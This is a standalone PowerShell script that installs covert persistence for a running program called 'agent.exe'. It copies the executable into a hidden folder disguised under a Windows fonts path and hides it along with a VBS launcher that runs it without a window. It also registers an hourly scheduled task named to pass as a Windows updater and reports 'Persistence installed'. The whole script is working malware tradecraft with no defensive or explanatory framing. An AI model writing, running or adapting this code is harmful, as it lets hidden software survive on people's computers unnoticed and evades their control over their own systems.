$agentProc = Get-Process -Name "agent" -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $agentProc) { Write-Output "No agent.exe running"; exit 1 }
$source = $agentProc.Path
$destDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null; attrib +h $destDir }
$dest = "$destDir\agent.exe"
Copy-Item -LiteralPath $source -Destination $dest -Force
attrib +h $dest

# Create VBS launcher
$vbs = "$destDir\run.vbs"
@"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "`"$dest`"", 0, False
"@ | Set-Content $vbs -Encoding ASCII
attrib +h $vbs

# Hourly task using schtasks (no admin needed)
$taskName = "WindowsUpdaterTaskHourly"
schtasks /delete /tn $taskName /f 2>$null
schtasks /create /tn $taskName /tr "wscript.exe `"$vbs`"" /sc hourly /mo 1 /ru $env:USERNAME /f /it
if ($LASTEXITCODE -eq 0) {
    Write-Output "✅ Persistence installed (hourly)"
    Start-Process -WindowStyle Hidden -FilePath $dest
} else {
    Write-Output "❌ Task creation failed"
}
